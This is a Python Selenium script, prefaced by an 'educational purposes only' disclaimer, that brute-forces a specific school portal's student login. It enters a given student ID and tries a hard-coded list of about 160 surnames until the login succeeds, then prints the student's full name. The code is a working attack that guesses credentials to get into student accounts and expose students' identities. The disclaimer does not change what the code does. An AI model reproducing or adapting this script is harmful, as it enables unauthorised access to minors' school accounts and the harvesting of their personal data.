'''
DISCLAIMER: EDUCATIONAL PURPOSES ONLY

The script discussed here demonstrates how certain web automation techniques could theoretically be used to find
student information (such as school IDs and last names) through school portals.

Important Notes:

Legal & Ethical Considerations:

Accessing or extracting personal information without explicit authorization is illegal in most jurisdictions (violating laws like FERPA, GDPR, etc.)

School systems often have strict security policies - unauthorized access may result in legal consequences or academic penalties

Intended Use:

This material is provided solely for educational purposes to demonstrate web automation concepts

It is meant for cybersecurity professionals, educators, and students learning about:

Ethical web scraping

System vulnerability awareness

Responsible disclosure practices

Prohibited Uses:

Do not use this information to access systems without written permission

Never collect, store, or distribute personal student data

Avoid using automated tools against systems that prohibit them in their ToS

Responsibility:

The author provides this information with the expectation of ethical use

Users assume full liability for any misuse

Educational institutions should use this knowledge to strengthen their security

Ethical Alternatives:

Always seek explicit permission before testing systems

Use school-approved APIs when available

Report vulnerabilities through proper channels

By studying this material, you agree to use this knowledge lawfully and ethically.
'''




import os
import time
from datetime import datetime
from selenium import webdriver # type: ignore
from selenium.webdriver.common.by import By # type: ignore
from selenium.webdriver.common.keys import Keys # type: ignore
from pyfiglet import figlet_format #type: ignore

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_terminal()
user_id = input("Enter the ID to use: ")

last_names = [
    "Sharma", "Peterson", "Garcia", "Navarrete", "Pelayo", "Canas", "Sorensen", 
    "Chen", "Felix", "Stallworth", "Ronkainen", "Hansen", "Zheng", "Granados", 
    "Sheikh", "Gupta", "Saboo", "Salguero", "Jefferson", "Yeung", "Chow", "Hug", 
    "Ng", "Ong", "Littlejohn", "Lozana", "Murad", "Teixeira", "Adiraju", "Adl", 
    "Ahmed", "Amato", "Anderson", "Arora", "B.C.", "Baker", "Barbu", "Bates", 
    "Benedetti", "Benn", "Benz", "Bhasin", "Bischofberger", "Bonaccorsi", 
    "Booher-Kaeding", "Kaeding", "Brittain", "Brucker", "Bui", "Bullington", 
    "Carel", "Carlton", "Chase", "Christensen", "Cimino", "Cimino", "Ciz", 
    "Cole", "Contreras", "Cooper", "Crawford", "Cruz", "Cruz Pivaral", "Pivaral", "D'Souza", "Souza",
    "De Martini", "Martini", "Dennis", "Do", "Dogra", "Elam", "Fornwald", "Franklin", 
    "Fronda", "Greene", "Grewal", "Guidace Angileri", "Angileri", "Gutierrez", "Hashimoto", 
    "Holcomb", "Howard", "Huang", "Huang", "Iglesias", "Jeung", "Johnson", 
    "Jose", "Kagel", "Kaur", "Kerr", "Leonarduzzi", "Lindsay", "Liu", "London", 
    "Lopez", "Luong", "Lyons", "Mameesh", "Mapelli", "Martin", "Martinez", 
    "Martinez", "McCluskey", "McLoy", "Min", "Mirshad", "Mukherjee", "Newsom", 
    "Noori", "Olson", "Ortiz", "Oviatt", "Pacio", "Peffer", "Penaverde", 
    "Peterson", "Prabhakaran", "Reid", "Resendez", "Riley", "Roberts", 
    "Rodrigues", "Rojas", "Rojas", "Sanfacon", "Sangam", "Savoie", "Pahna", 
    "Sharma", "Shockley", "Smith", "Soria", "Stephan", "Thorsen", "Tripp", 
    "Tucker", "Veizades", "Von Furst", "Furst", "Von", "Webb", "Wheaton", "Wilkinson", 
    "Williams", "Wong", "Woo", "Yazar", "Yow", "Yu", "Zamora", "Zheng"
]

driver = webdriver.Chrome()
driver.get("https://5starstudents.com/americanhs/login")

start_time = datetime.now()

try:
    id_field = driver.find_element(By.ID, "Number")
    id_field.clear()
    id_field.send_keys(user_id)
    
    for index, last_name in enumerate(last_names):
        name_field = driver.find_element(By.ID, "LastName")
        
        name_field.clear()
        name_field.send_keys(last_name)
        name_field.send_keys(Keys.RETURN)
        
        time.sleep(1) #abc
        
        current_url = driver.current_url
        if current_url != "https://5starstudents.com/americanhs/login":
            end_time = datetime.now()
            time_taken = end_time - start_time
            
            clear_terminal()
            
            try:
                full_name_element = driver.find_element(By.CSS_SELECTOR, "h4.mb-2.mb-sm-0.ms-sm-3.me-3")
                full_name = full_name_element.text.strip()
            except:
                full_name = "Full name not found"
            
            position = index + 1  
            total_names = len(last_names)
            
            prev_name = last_names[index-1] if index > 0 else "N/A (first in list)"
            next_name = last_names[index+1] if index < len(last_names)-1 else "N/A (last in list)"
            
            clear_terminal()
            print(figlet_format(full_name, font="slant"))
            print("="*50)
            print(f"SUCCESS! Match found in {time_taken.total_seconds():.2f} seconds")
            print("="*50)
            print(f"ID:        {user_id}")
            print(f"Name:        {full_name}")
            print("="*50)
            break
            
        time.sleep(0.5) #abc
        
    else:
        end_time = datetime.now()
        time_taken = end_time - start_time
        print(f"No matching last name found with ID {user_id} after {time_taken.total_seconds():.2f} seconds")
        
except Exception as e:
    print(f"An error occurred: {e}")
    
finally:
    driver.quit()